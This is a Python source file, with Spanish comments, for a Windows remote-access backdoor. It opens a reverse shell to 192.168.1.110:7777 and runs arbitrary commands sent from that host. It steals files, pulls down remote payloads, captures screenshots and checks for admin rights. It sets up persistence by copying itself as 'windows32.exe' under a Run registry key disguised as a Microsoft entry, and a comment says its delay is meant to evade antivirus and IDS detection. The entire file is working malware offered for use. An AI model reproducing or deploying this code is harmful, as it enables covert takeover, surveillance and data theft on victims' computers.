# Create by Al3jandr0M4p

import socket
import time
import base64
import subprocess
import os
import signal
import requests
import sys
import mss
import shutil

from colorama import Fore, Style, init

init()

def def_handler(signum, frame):
    sys.exit(1)

def root_check():
    global root
    try:
        check = os.listdir(os.sep.join([os.environ.get("SystemRoot", r"C:\windows"), 'temp']))
    except:
        root = f"{Fore.RED}ERROR, privilegios insuficientes! jajaj tienes que subir de rango(root/admin/administrator/administrados) papi.{Style.RESET_ALL}"
    else:
        root = f"{Fore.GREEN}Privilegios de administrador{Style.RESET_ALL}"

def persistencia_en_maquina():
    localizacion = os.environ['appdata'] + '\\windows32.exe'
    if not os.path.exists(localizacion):
        shutil.copyfile(sys.executable, localizacion)
        subprocess.run(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftVersionRun /t REG_SZ /d {localizacion}', shell=True)

def captura_pantalla_screenshot():
    screen = mss.mss()
    screen.shot()

def donwload_file_from_internet(url):
    consulta = requests.get(url)
    nombre_archivo = url.split("/")[-1]
    with open(nombre_archivo, 'wb') as get:
        get.write(consulta.content)

def conexion():
    time.sleep(20)#puedes subir el rango pero lo pongo aqui para que no sea tan detectable por el (IDS) del antivirus puedes bajarlo pero estas en riesgo de que mande muchas solicitudes de red y el antivirus lo detectara.
    while True:
        try:
            cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cliente.connect(('192.168.1.110', 7777))
            shell(cliente)
        except:
            conexion()

def shell(cliente):
    signal.signal(signal.SIGINT, def_handler)
    
    current_dir = os.getcwd()
    cliente.send(current_dir.encode())
    while True:
        res = cliente.recv(1024).decode()
        
        if res in ["exit", "salir"]:
            signal.raise_signal(signal.SIGINT)
        elif res[:2] == "cd" and len(res) > 2:
            os.chdir(res[3:])
            result = os.getcwd()
            cliente.send(result.encode())
        elif res[:8] == "download":
            with open(res[9:], 'rb') as download:
                cliente.send(base64.b64encode(download.read()))
        elif res[:3] == "get":
            try:
                donwload_file_from_internet(res[4:])
                cliente.send(f"{Fore.GREEN}Archivo descargado correctamente.{Style.RESET_ALL}".encode())
            except:
                cliente.send(f"{Fore.RED}Ocurrió un error en la descarga.{Style.RESET_ALL}".encode())
        elif res[:6] == "upload":
            with open(res[7:], 'wb') as upload:
                datos = cliente.recv(3000000)
                upload.write(base64.b64decode(datos))
        elif res[:10] == "screenshot":
            try:
                captura_pantalla_screenshot()
                with open('monitor-1.png', 'rb') as send:
                    cliente.send(base64.b64encode(send.read()))
                os.remove('monitor-1.png')
            except:
                cliente.send(base64.b64encode('error'))
        elif res[:5] == "start":
            try:
                subprocess.Popen(res[6:], shell=True)
                cliente.send(f"{Fore.GREEN}Programa iniciado exitosamente{Style.RESET_ALL}")
            except:
                cliente.send(f"{Fore.RED}El programa no pudo ser iniciado correctamente{Style.RESET_ALL}")
        elif res[:5] == "check":
            try:
                root_check()
                cliente.send(root)
            except:
                cliente.send(f"{Fore.RED}Error, no pudimos realizar el comando{Style.RESET_ALL}")
        else:
            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result) == 0:
                cliente.send("1".encode())
            else:
                cliente.send(result)

if __name__ == "__main__":
    conexion()
    persistencia_en_maquina()